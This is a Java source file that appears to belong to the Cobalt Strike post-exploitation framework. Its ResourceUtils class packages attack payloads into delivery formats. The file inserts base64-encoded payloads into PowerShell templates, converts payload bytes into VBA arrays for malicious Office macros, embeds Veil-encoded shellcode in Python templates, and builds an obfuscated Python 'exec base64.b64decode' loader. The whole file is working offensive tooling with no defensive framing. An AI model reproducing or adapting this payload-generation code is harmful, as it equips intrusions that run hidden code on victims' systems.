package common;

import aggressor.AggressorClient;
import encoders.Base64;
import encoders.Transforms;
import sleep.runtime.Scalar;
import sleep.runtime.SleepUtils;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.Stack;

public class ResourceUtils {
    protected AggressorClient client;

    public ResourceUtils(AggressorClient client) {
        this.client = client;
    }

    public byte[] getScriptedResource(String file, byte[] payload_x86, byte[] payload_x64) {
        Stack<Scalar> args = new Stack<>();
        args.push(SleepUtils.getScalar(payload_x64));
        args.push(SleepUtils.getScalar(payload_x86));
        args.push(SleepUtils.getScalar(file));
        String result = this.client.getScriptEngine().format("RESOURCE_GENERATOR", args);
        if (result == null) {
            return new byte[0];
        }
        return CommonUtils.toBytes(result);
    }

    public byte[] buildPython(byte[] payload, byte[] payload64) {
        byte[] result = this.getScriptedResource("template.py", payload, payload64);
        if (result.length == 0) {
            return ResourceUtils._buildPython(payload, payload64);
        }
        return result;
    }

    public byte[] buildMacro(byte[] payload) {
        byte[] result = this.getScriptedResource("template.x86.vba", payload, new byte[0]);
        if (result.length == 0) {
            return this._buildMacro(payload);
        }
        return result;
    }

    public byte[] buildPowerShell(byte[] payload, boolean x64) {
        byte[] result = new byte[]{};
        result = x64 ? this.getScriptedResource("template.x64.ps1", new byte[0], payload) : this.getScriptedResource("template.x86.ps1", payload, new byte[0]);
        if (result.length == 0) {
            return this._buildPowerShell(payload, x64);
        }
        return result;
    }

    public byte[] buildPowerShell(byte[] payload) {
        return this.buildPowerShell(payload, false);
    }

    public void buildPowerShell(byte[] payload, String outfile) {
        this.buildPowerShell(payload, outfile, false);
    }

    public void buildPowerShell(byte[] payload, String outfile, boolean x64) {
        byte[] output = this.buildPowerShell(payload, x64);
        CommonUtils.writeToFile(new File(outfile), output);
    }

    public byte[] _buildPowerShell(byte[] payload, boolean x64) {
        try {
            InputStream handle = CommonUtils.resource(x64 ? "resources/template.x64.ps1" : "resources/template.x86.ps1");
            byte[] data = CommonUtils.readAll(handle);
            handle.close();
            String template = CommonUtils.bString(data);
            template = CommonUtils.strrep(template, "%%DATA%%", Base64.encode(payload));
            return CommonUtils.toBytes(template);
        } catch (IOException ioex) {
            MudgeSanity.logException("buildPowerShell", ioex, false);
            return new byte[0];
        }
    }

    public byte[] _buildMacro(byte[] payload) {
        String macro = CommonUtils.bString(CommonUtils.readResource("resources/template.x86.vba"));
        String vba = "myArray = " + Transforms.toVBA(payload);
        macro = CommonUtils.strrep(macro, "$PAYLOAD$", vba);
        return CommonUtils.toBytes(macro);
    }

    public static byte[] _buildPython(byte[] payload, byte[] payload64) {
        try {
            InputStream handle = CommonUtils.resource("resources/template.py");
            byte[] data = CommonUtils.readAll(handle);
            handle.close();
            String template = CommonUtils.bString(data);
            template = CommonUtils.strrep(template, "$$CODE32$$", CommonUtils.bString(Transforms.toVeil(payload)));
            template = CommonUtils.strrep(template, "$$CODE64$$", CommonUtils.bString(Transforms.toVeil(payload64)));
            return CommonUtils.toBytes(template);
        } catch (IOException ioex) {
            MudgeSanity.logException("buildPython", ioex, false);
            return new byte[0];
        }
    }

    public String PythonCompress(byte[] code) {
        Stack<Scalar> args = new Stack<>();
        args.push(SleepUtils.getScalar(code));
        String result = this.client.getScriptEngine().format("PYTHON_COMPRESS", args);
        if (result == null) {
            return "import base64; exec base64.b64decode(\"" + Base64.encode(code) + "\")";
        }
        return result;
    }
}

